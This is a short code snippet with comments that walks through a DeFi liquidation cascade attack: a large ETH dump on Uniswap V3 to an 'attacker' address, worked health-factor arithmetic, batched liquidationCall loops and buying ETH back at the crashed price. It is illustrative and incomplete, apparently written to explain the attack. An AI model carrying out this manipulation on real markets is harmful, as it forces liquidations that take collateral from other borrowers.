// DEX: Large swap ETH → USDC on Uniswap V3
ISwapRouter(uniswap).exactInputSingle(
    ISwapRouter.ExactInputSingleParams({
        tokenIn: WETH,
        tokenOut: USDC,
        fee: 3000,
        recipient: attacker,
        amountIn: 10_000 ether, // Massive sell pressure
        amountOutMinimum: 0,
        sqrtPriceLimitX96: 0
    })
);

// Health Factor recalculation
// Collateral value = 500 ETH * $1,400 = $700,000
// Adjusted collateral = $700,000 * 0.825 = $577,500
// Health Factor = $577,500 / $600,000 = 0.9625

// HF < 1.0 → Position is liquidatable!
require(healthFactor < 1e18, "Cannot liquidate healthy position");

// Liquidator repays 50% of debt, seizes collateral + bonus
lendingPool.liquidationCall(
    ETH_ADDRESS,        // collateral asset
    USDC_ADDRESS,       // debt asset
    borrower,           // user to liquidate
    300_000 * 1e6,      // repay 50% = 300,000 USDC
    false               // receive underlying (not aToken)
);
// Receives: $300,000 / $1,400 * 1.05 = 225 ETH
// Profit: 225 ETH * $1,400 - $300,000 = $15,000

// Post-liquidation position:
// Remaining collateral: 275 ETH
// Remaining debt: 300,000 USDC
// But liquidation selling pressure drops ETH further...

// ETH drops to $1,200 from liquidation cascade
// New collateral value: 275 * $1,200 = $330,000
// New HF = ($330,000 * 0.825) / $300,000 = 0.9075

// Cascade: Multiple positions liquidated in sequence
for (uint i = 0; i < underwaterPositions.length; i++) {
    address borrower = underwaterPositions[i];
    uint256 debtToCover = getMaxLiquidation(borrower);

    lendingPool.liquidationCall(
        ETH_ADDRESS,
        USDC_ADDRESS,
        borrower,
        debtToCover,
        false
    );
    // Each liquidation dumps more ETH → price drops further
}

// Attacker buys back ETH at crashed price
